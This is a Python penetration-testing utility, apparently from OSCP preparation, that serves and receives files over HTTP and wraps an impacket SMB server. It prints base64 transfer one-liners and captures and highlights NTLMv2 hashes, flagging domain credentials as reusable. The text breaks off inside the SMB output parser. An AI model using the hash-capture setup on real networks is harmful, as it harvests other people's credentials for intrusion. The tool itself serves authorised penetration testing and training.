#!/usr/bin/env python3
"""
Enhanced File Transfer Server with Recursive File Listing + SMB Support

Features:
  - HTTP server with recursive file listing
  - SMB server support (requires impacket)
  - NTLM hash capture (automatic with SMB)
  - Table format for better readability
  - Real-time progress bar for transfers
  - MD5 hash display for integrity verification
  - Transfer history log with timestamps
  - Multiple network interface detection

Usage:
    tools.py                          # HTTP only (default)
    tools.py -p 8080                  # custom HTTP port
    tools.py -dir                     # downloads from current dir
    tools.py -dir /tmp/stuff          # downloads from specific dir
    
    # SMB Examples:
    tools.py -smb                     # HTTP + SMB (anonymous, port 445, SMB2 ON)
    tools.py -smb -sp 4445            # SMB on custom port (no root)
    tools.py -smb -no-smb2            # disable SMB2 protocol
    tools.py -smb -smbuser admin -smbpass secret  # authenticated access
    tools.py -smb -smbshare tools     # custom share name (default: evil)

SMB Features:
    - Serves files from download directory
    - Captures NTLMv2 hashes (shown in red [HASH])
    - Logs connections, file access, uploads

Requirements:
    sudo apt install python3-impacket  # for SMB support (Kali/Debian)
"""

import os
import sys
import argparse
import cgi
import time
import hashlib
import base64
import json
import urllib.parse
import threading
import subprocess
import shutil
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler

# ============ EDIT DEFAULTS HERE ============
DEFAULT_PORT = 80
DEFAULT_DOWNLOAD_DIR = "/home/alien/Desktop/OSCP/Tools"
DEFAULT_SMB_PORT = 445
DEFAULT_SMB_SHARE = "evil"
# Upload dir is always current working directory
# ============================================

# SMB Server support - uses impacket-smbserver CLI tool
# Install: sudo apt install python3-impacket

CHUNK_SIZE = 64 * 1024
transfer_log = []

class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    UNDERLINE = '\033[4m'


def timestamp():
    return datetime.now().strftime("%H:%M:%S")


def get_md5(filepath):
    hash_md5 = hashlib.md5()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def get_file_color(filename):
    ext = os.path.splitext(filename)[1].lower()
    colors = {
        '.exe': C.RED, '.dll': C.RED, '.bat': C.RED,
        '.ps1': C.BLUE, '.psm1': C.BLUE,
        '.sh': C.GREEN, '.py': C.YELLOW,
        '.rb': C.MAGENTA, '.pl': C.MAGENTA,
        '.txt': C.WHITE, '.md': C.WHITE,
        '.conf': C.CYAN, '.cfg': C.CYAN, '.xml': C.CYAN, '.json': C.CYAN,
        '.zip': C.YELLOW, '.tar': C.YELLOW, '.gz': C.YELLOW, '.7z': C.YELLOW,
        '.elf': C.RED, '.bin': C.RED,
    }
    return colors.get(ext, C.RESET)


def get_all_files_recursive(directory, max_depth=2, max_files=500):
    """Recursively get all files in directory with relative paths"""
    all_files = []
    
    def scan_dir(path, current_depth=0, prefix=""):
        if current_depth > max_depth:
            return
        
        if len(all_files) >= max_files:
            return
        
        try:
            items = sorted(os.listdir(path))
            for item in items:
                if item.startswith('.'):
                    continue
                
                if len(all_files) >= max_files:
                    return
                    
                full_path = os.path.join(path, item)
                rel_path = os.path.relpath(full_path, directory)
                
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    all_files.append((rel_path, size, current_depth))
                elif os.path.isdir(full_path):
                    scan_dir(full_path, current_depth + 1, rel_path + "/")
        except PermissionError:
            pass
    
    scan_dir(directory)
    return all_files


def format_size(size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024:
            return f"{size:.1f}{unit}"
        size /= 1024
    return f"{size:.1f}TB"


def print_files_table(files, hit_limit=False):
    """Print files in a smart, organized format"""
    if not files:
        print(f"{C.WHITE}Available files (0):{C.RESET}")
        return
    
    total_files = len(files)
    
    # Separate top-level files from nested files
    top_level_files = []
    directories = {}
    
    for rel_path, size, depth in files:
        if depth == 0:
            # Top-level file
            top_level_files.append((rel_path, size))
        else:
            # Nested file - group by top-level directory
            top_dir = rel_path.split('/')[0]
            if top_dir not in directories:
                directories[top_dir] = {'count': 0, 'total_size': 0, 'files': []}
            directories[top_dir]['count'] += 1
            directories[top_dir]['total_size'] += size
            directories[top_dir]['files'].append((rel_path, size))
    
    file_count_msg = f"{total_files}+" if hit_limit else str(total_files)
    print(f"{C.WHITE}Available files: {file_count_msg} ({len(top_level_files)} in root, {len(directories)} directories){C.RESET}")
    
    if hit_limit:
        print(f"{C.YELLOW}⚠️  File limit reached (5000). Not all files are shown.{C.RESET}")
    
    # Show directories summary
    if directories:
        print(f"\n{C.YELLOW}📁 DIRECTORIES:{C.RESET}")
        
        # Show directories in compact 2-column layout
        dir_names = sorted(directories.keys())
        for i in range(0, len(dir_names), 2):
            dir1 = dir_names[i] if i < len(dir_names) else ""
            dir2 = dir_names[i+1] if i+1 < len(dir_names) else ""
            
            count1 = f"({directories[dir1]['count']} files)" if dir1 else ""
            count2 = f"({directories[dir2]['count']} files)" if dir2 else ""
            
            if dir1 and dir2:
                print(f"  {C.CYAN}📂 {dir1:<45}{C.RESET} {C.GRAY}{count1:<15}{C.RESET}  {C.CYAN}📂 {dir2:<45}{C.RESET} {C.GRAY}{count2}{C.RESET}")
            elif dir1:
                print(f"  {C.CYAN}📂 {dir1}{C.RESET} {C.GRAY}{count1}{C.RESET}")
    
    # Show top-level files
    if top_level_files:
        print(f"\n{C.YELLOW}📄 TOP-LEVEL FILES ({len(top_level_files)}):{C.RESET}")
        
        # Show files in compact 2-column layout
        for i in range(0, len(top_level_files), 2):
            file1 = top_level_files[i][0] if i < len(top_level_files) else ""
            file2 = top_level_files[i+1][0] if i+1 < len(top_level_files) else ""
            
            color1 = get_file_color(file1) if file1 else ""
            color2 = get_file_color(file2) if file2 else ""
            
            if file1 and file2:
                print(f"  {color1}{file1:<55}{C.RESET}  {color2}{file2}{C.RESET}")
            elif file1:
                print(f"  {color1}{file1}{C.RESET}")


def get_html_head(title):
    return f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>
body {{ font-family: 'Consolas', 'Monaco', monospace; background: #1a1a2e; color: #eee; padding: 20px; margin: 0; }}
h1, h2 {{ color: #00ff88; margin-top: 0; }}
h3 {{ color: #ccc; margin: 0 0 10px 0; font-size: 14px; }}
table {{ border-collapse: collapse; width: 100%; }}
th, td {{ text-align: left; padding: 8px 10px; border-bottom: 1px solid #333; }}
tr:hover {{ background: #16213e; }}
a {{ color: #00d4ff; text-decoration: none; }}
a:hover {{ text-decoration: underline; }}
.size {{ color: #888; }}
.nested {{ color: #666; padding-left: 20px; }}
pre {{ background: #0f0f23; padding: 12px; border-radius: 5px; overflow-x: auto; word-wrap: break-word; white-space: pre-wrap; margin: 0; font-size: 13px; }}
.code-block {{ position: relative; }}
.copy-btn {{ 
    position: absolute; top: 8px; right: 8px; 
    background: #00d4ff; color: #000; border: none; 
    padding: 5px 10px; border-radius: 3px; cursor: pointer;
    font-family: inherit; font-size: 11px; font-weight: bold;
}}
.copy-btn:hover {{ background: #00ff88; }}
.download {{ color: #00d4ff; }}
.upload {{ color: #00ff88; }}
.nav {{ margin-bottom: 20px; padding: 10px; background: #0f0f23; border-radius: 5px; }}
.nav a {{ margin-right: 20px; }}
.two-col {{ display: flex; gap: 20px; margin: 20px 0; }}
.two-col > div {{ flex: 1; min-width: 0; }}
.section {{ margin: 20px 0; }}
.file-cmds {{ font-size: 11px; color: #888; }}
.file-cmds code {{ background: #0f0f23; padding: 2px 6px; border-radius: 3px; color: #00d4ff; }}
</style>
</head><body>
<div class="nav">
    <a href="/files">Files</a>
    <a href="/log">Log</a>
</div>
"""


HTML_FOOT = """
<script>
function copyCmd(btn, id) {
    var el = document.getElementById(id);
    var text = el.innerText || el.textContent;
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function() {
            btn.innerText = 'Copied!';
            btn.style.background = '#00ff88';
            setTimeout(function() {
                btn.innerText = 'Copy';
                btn.style.background = '#00d4ff';
            }, 1500);
        });
    } else {
        var ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        document.body.appendChild(ta);
        ta.select();
        try {
            document.execCommand('copy');
            btn.innerText = 'Copied!';
            btn.style.background = '#00ff88';
            setTimeout(function() {
                btn.innerText = 'Copy';
                btn.style.background = '#00d4ff';
            }, 1500);
        } catch(e) {}
        document.body.removeChild(ta);
    }
}
</script>
</body></html>"""


class ProgressBar:
    def __init__(self, filename, total_size, direction="DOWN"):
        self.filename = filename
        self.total_size = total_size
        self.transferred = 0
        self.direction = direction
        self.start_time = time.time()
        self.last_update = 0
    
    def format_size(self, size):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f}{unit}"
            size /= 1024
        return f"{size:.1f}TB"
    
    def format_speed(self, speed):
        for unit in ['B/s', 'KB/s', 'MB/s', 'GB/s']:
            if speed < 1024:
                return f"{speed:.1f}{unit}"
            speed /= 1024
        return f"{speed:.1f}TB/s"
    
    def update(self, chunk_size):
        self.transferred += chunk_size
        current_time = time.time()
        
        if current_time - self.last_update < 0.1 and self.transferred < self.total_size:
            return
        self.last_update = current_time
        
        percent = (self.transferred / self.total_size) * 100 if self.total_size > 0 else 0
        elapsed = current_time - self.start_time
        speed = self.transferred / elapsed if elapsed > 0 else 0
        
        if speed > 0 and self.total_size > 0:
            remaining = self.total_size - self.transferred
            eta = remaining / speed
            eta_str = f"{eta:.0f}s" if eta < 60 else f"{eta/60:.1f}m"
        else:
            eta_str = "---"
        
        bar_width = 25
        filled = int(bar_width * percent / 100)
        bar = '█' * filled + '░' * (bar_width - filled)
        
        arrow = f"{C.CYAN}↓{C.RESET}" if self.direction == "DOWN" else f"{C.GREEN}↑{C.RESET}"
        
        progress_line = (
            f"\r{arrow} {C.YELLOW}[{bar}]{C.RESET} "
            f"{percent:5.1f}% | "
            f"{self.format_size(self.transferred)}/{self.format_size(self.total_size)} | "
            f"{self.format_speed(speed)} | "
            f"ETA: {eta_str}  "
        )
        
        sys.stdout.write(progress_line)
        sys.stdout.flush()
    
    def finish(self):
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        sys.stdout.flush()


class DualHandler(SimpleHTTPRequestHandler):
    upload_dir = None
    download_dir = None
    server_ip = None
    server_port = None
    
    def do_GET(self):
        if self.path == '/list' or self.path == '/list/':
            self.handle_list_json()
            return
        
        if self.path == '/files' or self.path == '/files/':
            self.handle_file_browser()
            return
        
        if self.path.startswith('/b64/'):
            self.handle_base64_download()
            return
        
        if self.path == '/log' or self.path == '/log/':
            self.handle_log()
            return
        
        path = self.translate_path(self.path)
        # Get the relative path for better logging
        try:
            filename = os.path.relpath(path, self.download_dir)
        except:
            filename = os.path.basename(self.path) if self.path != '/' else '/'
        
        ts = timestamp()
        print(f"{C.GRAY}[{ts}]{C.RESET} {C.YELLOW}[TRY]{C.RESET}  GET {filename} <- {self.client_address[0]}")
        
        if os.path.isfile(path):
            self.send_file_with_progress(path, filename)
        else:
            result = super().do_GET()
            print(f"{C.GRAY}[{ts}]{C.RESET} {C.RED}[FAIL]{C.RESET} {filename} not found")
        
        return None
    
    def handle_list_json(self):
        # Skip indexing for system directories
        skip_indexing_paths = ['/', '/usr', '/bin', '/sbin', '/lib', '/lib64', '/boot', '/dev', '/proc', '/sys', '/var', '/etc', '/root']
        should_skip = self.download_dir in skip_indexing_paths or any(self.download_dir.startswith(p + '/') for p in skip_indexing_paths)
        
        if should_skip:
            response = json.dumps({
                'error': 'File indexing disabled for system directories',
                'directory': self.download_dir
            }, indent=2).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json; charset=utf-8')
            self.send_header('Content-Length', len(response))
            self.end_headers()
            self.wfile.write(response)
            return
        
        files = []
        for rel_path, size, depth in get_all_files_recursive(self.download_dir):
            filepath = os.path.join(self.download_dir, rel_path)
            files.append({
                'name': rel_path,
                'size': size,
                'depth': depth,
                'md5': get_md5(filepath)
            })
        
        response = json.dumps(files, indent=2).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def handle_file_browser(self):
        # Skip indexing for system directories
        skip_indexing_paths = ['/', '/usr', '/bin', '/sbin', '/lib', '/lib64', '/boot', '/dev', '/proc', '/sys', '/var', '/etc', '/root']
        should_skip = self.download_dir in skip_indexing_paths or any(self.download_dir.startswith(p + '/') for p in skip_indexing_paths)
        
        if should_skip:
            html = get_html_head("File Server")
            html += f"""<h1>File Server</h1>
<p>IP: {self.server_ip} | Port: {self.server_port}</p>
<div style="background: #0f0f23; padding: 20px; border-radius: 5px; margin: 20px 0;">
<h2 style="color: #ff9900; margin-top: 0;">⚠️ File Indexing Disabled</h2>
<p>Directory: <code style="color: #00d4ff;">{self.download_dir}</code></p>
<p>File browsing is disabled for system directories to prevent performance issues.</p>
<p>You can still download files if you know the exact path:</p>
<pre style="margin: 10px 0;">curl http://{self.server_ip}:{self.server_port}/path/to/file.txt -o file.txt</pre>
</div>
""" + HTML_FOOT
            
            response = html.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', len(response))
            self.end_headers()
            self.wfile.write(response)
            return
        
        files = get_all_files_recursive(self.download_dir)
        base_url = f"http://{self.server_ip}:{self.server_port}"
        
        # Group files by directory
        file_groups = {}
        file_groups['_root'] = []
        
        for rel_path, size, depth in files:
            if depth == 0:
                file_groups['_root'].append((rel_path, size, depth))
            else:
                top_dir = rel_path.split('/')[0]
                if top_dir not in file_groups:
                    file_groups[top_dir] = []
                file_groups[top_dir].append((rel_path, size, depth))
        
        html = get_html_head("File Server")
        html += f"""<h1>File Server</h1>
<p>IP: {self.server_ip} | Port: {self.server_port} | Total Files: {len(files)}</p>
<p style="color: #888; font-size: 12px;">💡 Files save with basename only. Example: <code style="color: #00d4ff;">download dir/file.exe</code> → saves as <code style="color: #00ff88;">file.exe</code></p>

<input type="text" id="searchBox" placeholder="🔍 Search files..." 
       style="width: 100%; padding: 10px; margin: 10px 0; background: #0f0f23; color: #eee; border: 1px solid #333; border-radius: 5px; font-family: inherit;">

<div id="fileList">
"""
        
        # Show root files first if any
        if file_groups['_root']:
            html += f"""<h3 style="margin-top: 20px;">📄 Root Files ({len(file_groups['_root'])})</h3>
<table class="file-table">
<tr><th>File</th><th>Size</th><th>Command</th></tr>
"""
            for rel_path, size, depth in file_groups['_root']:
                size_str = format_size(size)
                url_path = urllib.parse.quote(rel_path)
                cmd = f'download {rel_path}'
                
                html += f"""<tr class="file-row" data-name="{rel_path.lower()}">
<td><a href="/{url_path}">{rel_path}</a></td>
<td class="size">{size_str}</td>
<td class="file-cmds"><code>{cmd}</code></td>
</tr>"""
            html += "</table>"
        
        # Show directories
        for dir_name in sorted([k for k in file_groups.keys() if k != '_root']):
            dir_files = file_groups[dir_name]
            total_size = sum(size for _, size, _ in dir_files)
            
            html += f"""<h3 style="margin-top: 20px;">📁 {dir_name}/ ({len(dir_files)} files, {format_size(total_size)})</h3>
<table class="file-table">
<tr><th>File Path</th><th>Saves As</th><th>Size</th><th>Command</th></tr>
"""
            for rel_path, size, depth in dir_files:
                size_str = format_size(size)
                url_path = urllib.parse.quote(rel_path)
                filename = os.path.basename(rel_path)
                cmd = f'download {rel_path}'
                
                # Show indentation for nested files
                indent = '&nbsp;&nbsp;' * (depth - 1) if depth > 1 else ''
                display_path = f"{indent}{rel_path.split('/')[-1] if depth > 1 else rel_path}"
                
                html += f"""<tr class="file-row" data-name="{rel_path.lower()}">
<td><a href="/{url_path}">{rel_path}</a></td>
<td style="color: #00ff88;">{filename}</td>
<td class="size">{size_str}</td>
<td class="file-cmds"><code>{cmd}</code></td>
</tr>"""
            html += "</table>"
        
        html += """</div>
<script>
document.getElementById('searchBox').addEventListener('input', function(e) {
    var search = e.target.value.toLowerCase();
    var rows = document.querySelectorAll('.file-row');
    var tables = document.querySelectorAll('.file-table');
    
    rows.forEach(function(row) {
        var name = row.getAttribute('data-name');
        if (name.includes(search)) {
            row.style.display = '';
        } else {
            row.style.display = 'none';
        }
    });
    
    // Hide empty tables
    tables.forEach(function(table) {
        var visibleRows = Array.from(table.querySelectorAll('.file-row')).filter(r => r.style.display !== 'none');
        var header = table.previousElementSibling;
        if (visibleRows.length === 0) {
            table.style.display = 'none';
            if (header && header.tagName === 'H3') header.style.display = 'none';
        } else {
            table.style.display = '';
            if (header && header.tagName === 'H3') header.style.display = '';
        }
    });
});
</script>
"""
        html += HTML_FOOT
        
        response = html.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def handle_base64_download(self):
        rel_path = urllib.parse.unquote(self.path[5:])
        filepath = os.path.join(self.download_dir, rel_path)
        filename = os.path.basename(rel_path)
        
        if not os.path.isfile(filepath):
            self.send_error(404, "File not found")
            return
        
        filesize = os.path.getsize(filepath)
        if filesize > 1024 * 1024:
            self.send_error(413, "File too large for base64 (max 1MB)")
            return
        
        with open(filepath, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
        
        file_md5 = get_md5(filepath)
        linux_cmd = f"echo '{encoded}' | base64 -d > {filename}"
        ps_cmd = f'[IO.File]::WriteAllBytes("$pwd\\{filename}", [Convert]::FromBase64String("{encoded}"))'
        
        html = get_html_head(f"Base64: {filename}")
        html += f"""<h2>Base64: {rel_path}</h2>
<p>Size: {format_size(filesize)} | Encoded: {len(encoded)} chars | MD5: {file_md5}</p>

<div class="two-col">
<div>
<h3>Linux</h3>
<div class="code-block">
<button class="copy-btn" onclick="copyCmd(this, 'linux-cmd')">Copy</button>
<pre id="linux-cmd">{linux_cmd}</pre>
</div>
</div>
<div>
<h3>PowerShell</h3>
<div class="code-block">
<button class="copy-btn" onclick="copyCmd(this, 'ps-cmd')">Copy</button>
<pre id="ps-cmd">{ps_cmd}</pre>
</div>
</div>
</div>

<div class="section">
<h3>Raw Base64</h3>
<div class="code-block">
<button class="copy-btn" onclick="copyCmd(this, 'raw-b64')">Copy</button>
<pre id="raw-b64">{encoded}</pre>
</div>
</div>
"""
        html += HTML_FOOT
        
        response = html.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def handle_log(self):
        html = get_html_head("Transfer Log")
        html += """<h1>Transfer Log</h1>
<table>
<tr><th>Time</th><th>Type</th><th>File</th><th>Size</th><th>Client</th><th>MD5</th></tr>
"""
        for entry in reversed(transfer_log[-50:]):
            type_class = 'download' if entry['type'] == 'DOWN' else 'upload'
            html += f"""<tr>
<td>{entry['time']}</td>
<td class="{type_class}">{entry['type']}</td>
<td>{entry['file']}</td>
<td>{entry['size']}</td>
<td>{entry['client']}</td>
<td>{entry.get('md5', 'N/A')[:16]}...</td>
</tr>"""
        
        if not transfer_log:
            html += '<tr><td colspan="6" style="text-align:center;color:#666;">No transfers yet</td></tr>'
        
        html += "</table>" + HTML_FOOT
        
        response = html.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)
    
    def send_file_with_progress(self, path, filename):
        try:
            filesize = os.path.getsize(path)
            file_md5 = get_md5(path)
            
            self.send_response(200)
            self.send_header("Content-Type", self.guess_type(path))
            self.send_header("Content-Length", str(filesize))
            self.send_header("X-MD5", file_md5)
            self.end_headers()
            
            progress = ProgressBar(filename, filesize, "DOWN")
            
            with open(path, 'rb') as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    try:
                        self.wfile.write(chunk)
                        progress.update(len(chunk))
                    except (BrokenPipeError, ConnectionResetError):
                        progress.finish()
                        print(f"{C.GRAY}[{timestamp()}]{C.RESET} {C.RED}[FAIL]{C.RESET} {filename} - connection lost")
                        return
            
            progress.finish()
            elapsed = time.time() - progress.start_time
            avg_speed = filesize / elapsed if elapsed > 0 else 0
            
            ts = timestamp()
            color = get_file_color(filename)
            print(f"{C.GRAY}[{ts}]{C.RESET} {C.GREEN}[DONE]{C.RESET} {color}{filename}{C.RESET} ({format_size(filesize)}) in {elapsed:.1f}s @ {ProgressBar.format_speed(None, avg_speed)}")
            print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}[MD5]{C.RESET}  {file_md5}")
            
            transfer_log.append({
                'time': ts,
                'type': 'DOWN',
                'file': filename,
                'size': format_size(filesize),
                'client': self.client_address[0],
                'md5': file_md5
            })
            
        except Exception as e:
            print(f"{C.GRAY}[{timestamp()}]{C.RESET} {C.RED}[FAIL]{C.RESET} {filename} - {e}")
    
    def do_PUT(self):
        try:
            ts = timestamp()
            filename = os.path.basename(urllib.parse.unquote(self.path))
            filepath = os.path.join(self.upload_dir, filename)
            
            content_length = int(self.headers.get('Content-Length', 0))
            
            print(f"{C.GRAY}[{ts}]{C.RESET} {C.YELLOW}[TRY]{C.RESET}  PUT {filename} <- {self.client_address[0]}")
            
            progress = ProgressBar(filename, content_length, "UP")
            
            with open(filepath, 'wb') as f:
                remaining = content_length
                while remaining > 0:
                    chunk_size = min(CHUNK_SIZE, remaining)
                    chunk = self.rfile.read(chunk_size)
                    if not chunk:
                        break
                    f.write(chunk)
                    remaining -= len(chunk)
                    progress.update(len(chunk))
            
            progress.finish()
            
            file_md5 = get_md5(filepath)
            color = get_file_color(filename)
            print(f"{C.GRAY}[{ts}]{C.RESET} {C.GREEN}[UP]{C.RESET}   {color}{filename}{C.RESET} ({format_size(content_length)})")
            print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}[MD5]{C.RESET}  {file_md5}")
            print(f"{C.GRAY}[{ts}]{C.RESET} {C.BLUE}[SAVE]{C.RESET} {filepath}")
            
            transfer_log.append({
                'time': ts,
                'type': 'UP',
                'file': filename,
                'size': format_size(content_length),
                'client': self.client_address[0],
                'md5': file_md5
            })
            
            response = f"Uploaded: {filename} ({format_size(content_length)})\nMD5: {file_md5}\n"
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', len(response))
            self.end_headers()
            self.wfile.write(response.encode())
            
        except Exception as e:
            print(f"{C.GRAY}[{timestamp()}]{C.RESET} {C.RED}[FAIL]{C.RESET} Upload error: {e}")
            self.send_error(500, str(e))
    
    def do_POST(self):
        try:
            ts = timestamp()
            content_type = self.headers.get('Content-Type', '')
            content_length = int(self.headers.get('Content-Length', 0))
            
            if 'multipart/form-data' in content_type:
                # Handle multipart form upload (curl -F)
                uploaded_files = []
                
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={
                        'REQUEST_METHOD': 'POST',
                        'CONTENT_TYPE': content_type,
                    }
                )
                
                if 'files' in form:
                    items = form['files']
                    if not isinstance(items, list):
                        items = [items]
                    
                    for item in items:
                        if item.filename:
                            filename = os.path.basename(item.filename)
                            filepath = os.path.join(self.upload_dir, filename)
                            
                            data = item.file.read()
                            with open(filepath, 'wb') as f:
                                f.write(data)
                            
                            filesize = len(data)
                            file_md5 = get_md5(filepath)
                            uploaded_files.append(filename)
                            
                            color = get_file_color(filename)
                            print(f"{C.GRAY}[{ts}]{C.RESET} {C.BLUE}[UP]{C.RESET}   {color}{filename}{C.RESET} ({format_size(filesize)})")
                            print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}[MD5]{C.RESET}  {file_md5}")
                            print(f"{C.GRAY}[{ts}]{C.RESET} {C.BLUE}[SAVE]{C.RESET} {filepath}")
                            
                            transfer_log.append({
                                'time': ts,
                                'type': 'UP',
                                'file': filename,
                                'size': format_size(filesize),
                                'client': self.client_address[0],
                                'md5': file_md5
                            })
            
                if uploaded_files:
                    response = f"Uploaded: {', '.join(uploaded_files)}\n"
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.send_header('Content-Length', len(response))
                    self.end_headers()
                    self.wfile.write(response.encode())
                else:
                    print(f"{C.GRAY}[{ts}]{C.RESET} {C.RED}[FAIL]{C.RESET} No files in request")
                    self.send_error(400, "No files uploaded")
            else:
                # Handle raw POST data (wget --post-file, curl -d @file)
                # Get filename from URL path
                filename = os.path.basename(urllib.parse.unquote(self.path))
                if not filename or filename == '/':
                    filename = f"upload_{int(time.time())}"
                
                filepath = os.path.join(self.upload_dir, filename)
                
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.YELLOW}[TRY]{C.RESET}  POST {filename} <- {self.client_address[0]}")
                
                # Read raw body with progress
                progress = ProgressBar(filename, content_length, "UP")
                
                with open(filepath, 'wb') as f:
                    remaining = content_length
                    while remaining > 0:
                        chunk_size = min(CHUNK_SIZE, remaining)
                        chunk = self.rfile.read(chunk_size)
                        if not chunk:
                            break
                        f.write(chunk)
                        remaining -= len(chunk)
                        progress.update(len(chunk))
                
                progress.finish()
                
                file_md5 = get_md5(filepath)
                color = get_file_color(filename)
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.GREEN}[UP]{C.RESET}   {color}{filename}{C.RESET} ({format_size(content_length)})")
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.CYAN}[MD5]{C.RESET}  {file_md5}")
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.BLUE}[SAVE]{C.RESET} {filepath}")
                
                transfer_log.append({
                    'time': ts,
                    'type': 'UP',
                    'file': filename,
                    'size': format_size(content_length),
                    'client': self.client_address[0],
                    'md5': file_md5
                })
                
                response = f"Uploaded: {filename} ({format_size(content_length)})\nMD5: {file_md5}\n"
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', len(response))
                self.end_headers()
                self.wfile.write(response.encode())
                
        except Exception as e:
            print(f"{C.GRAY}[{timestamp()}]{C.RESET} {C.RED}[FAIL]{C.RESET} {e}")
            self.send_error(500, str(e))
    
    def log_message(self, format, *args):
        pass


def smb_output_reader(proc, smb_signing=False, smb_user=None, primary_ip=None):
    """Read and classify SMB server output with full connection state tracking.

    Catchers:
      - CONN→DISC (no auth)          : port scan / bare TCP probe
      - CONN→AUTH→DISC (no share)    : SMB signing rejection
      - CONN→AUTH→SHARE→DISC         : share enumeration (no file ops)
      - CONN→AUTH→SHARE→FILE→DISC    : transfer attempt (completed or aborted)
      - Rapid reconnects from same IP : retry storm / credential loop
      - Hash from unexpected IP       : unexpected host on network
      - Domain creds on anonymous srv : credential intel callout
    """
    import re
    from collections import deque

    # ── Per-connection state ─────────────────────────────────────────────────
    conn_ip        = None
    conn_had_auth  = False
    conn_had_share = False
    conn_had_file  = False
    conn_authed_user = None   # extracted from AUTHENTICATE_MESSAGE

    # ── Cross-connection state ───────────────────────────────────────────────
    seen_ips          = set()   # all IPs that have ever connected
    conn_times        = {}      # ip → deque of recent conn timestamps (retry storm)
    RETRY_WINDOW_SECS = 10
    RETRY_THRESHOLD   = 4       # N conns in window = storm

    def warn(ts, msg):
        print(f"{C.GRAY}[{ts}]{C.RESET} {C.RED}{C.BOLD}[SMB] [!]{C.RESET} {C.YELLOW}{msg}{C.RESET}")

    def _extract_ip(text):
        m = re.search(r'\((\d+\.\d+\.\d+\.\d+),', text)
        return m.group(1) if m else None

    def _extract_auth_user(text):
        # AUTHENTICATE_MESSAGE (DOMAIN\user,HOSTNAME)
        m = re.search(r'AUTHENTICATE_MESSAGE\s*\(([^,]+),', text)
        return m.group(1) if m else None

    try:
        for line in proc.stdout:
            text = line.rstrip()
            if not text:
                continue

            ts = timestamp()

            # Skip noisy impacket startup lines
            if any(skip in text for skip in ['Config file parsed', 'Callback added',
                   'Installation Path', 'Impacket Library', 'Copyright']):
                continue

            # ── CONN ─────────────────────────────────────────────────────────
            if 'Incoming connection' in text:
                conn_ip        = _extract_ip(text)
                conn_had_auth  = False
                conn_had_share = False
                conn_had_file  = False
                conn_authed_user = None

                print(f"{C.GRAY}[{ts}]{C.RESET} {C.GREEN}[SMB] [CONN]{C.RESET} {text}")

                if conn_ip:
                    # Unexpected IP catcher
                    if seen_ips and conn_ip not in seen_ips:
                        warn(ts, f"New source IP {conn_ip} — unexpected host connecting to share")

                    seen_ips.add(conn_ip)

                    # Retry storm catcher
                    now = time.time()
                    dq = conn_times.setdefault(conn_ip, deque())
                    dq.append(now)
                    # Prune old entries outside window
                    while dq and now - dq[0] > RETRY_WINDOW_SECS:
                        dq.popleft()
                    if len(dq) >= RETRY_THRESHOLD:
                        warn(ts, f"{conn_ip} — {len(dq)} connections in {RETRY_WINDOW_SECS}s: retry storm / credential loop")

            # ── AUTH ─────────────────────────────────────────────────────────
            elif 'AUTHENTICATE_MESSAGE' in text:
                conn_had_auth    = True
                conn_authed_user = _extract_auth_user(text)
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.GREEN}[SMB] [AUTH]{C.RESET} {text}")

            elif 'authenticated successfully' in text:
                conn_had_auth = True
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.GREEN}[SMB] [AUTH]{C.RESET} {text}")

                # Domain creds on anonymous server catcher
                if smb_user is None and conn_authed_user:
                    # Strip machine account noise (ends with $)
                    if not conn_authed_user.rstrip().endswith('$'):
                        warn(ts, f"Domain creds presented to anonymous share: {conn_authed_user} — hash may be reusable")

            # ── HASH ─────────────────────────────────────────────────────────
            elif ('::' in text and len(text) > 30) or 'NTLMv' in text:
                print(f"{C.GRAY}[{ts}]{C.RESET} {C.RED}{C.BOLD}[SMB] [HASH]{C.RESET} {C.RED}{text}{C.RESET}")

